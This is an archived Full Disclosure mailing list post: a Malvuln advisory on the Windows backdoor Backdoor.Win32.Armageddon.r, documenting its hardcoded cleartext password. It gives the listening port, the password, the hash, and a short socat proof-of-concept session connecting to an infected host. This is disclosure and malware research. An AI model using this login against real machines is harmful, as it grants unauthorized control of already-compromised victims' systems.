---
title: BACKDOOR.WIN32.ARMAGEDDON.R / Hardcoded Cleartext Credentials
url: https://seclists.org/fulldisclosure/2024/Mar/3
source: Full Disclosure
date: 2024-03-04
fetch_date: 2025-10-04T12:11:45.777650
---

# BACKDOOR.WIN32.ARMAGEDDON.R / Hardcoded Cleartext Credentials

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# BACKDOOR.WIN32.ARMAGEDDON.R / Hardcoded Cleartext Credentials

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Thu, 22 Feb 2024 22:20:29 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/68d135936512e88cc0704b90bb3839e0.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln

Threat: Backdoor.Win32.Armageddon.r
Vulnerability: Hardcoded Cleartext Credentials
Description: The malware listens on TCP port 5859 and requires
authentication. The password "KOrUPtIzEre" is stored in cleartext within
the PE file at offset 0x4635f. Connecting to the backdoor returns the value
"1" then enter the password.
Family: Armageddon
Type: PE32
MD5: 68d135936512e88cc0704b90bb3839e0
Vuln ID: MVID-2024-0670
Dropped files: IP-logs.txt
Disclosure: 02/22/2024

Exploit/PoC:
root@kali:/home/kali# socat - TCP4:x.x.x.x:5859
1  KOrUPtIzEre
1  DESKTOP-2C4IJHO  VICTIM   Wed

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

### Current thread:

* **BACKDOOR.WIN32.ARMAGEDDON.R / Hardcoded Cleartext Credentials** *malvuln (Mar 02)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")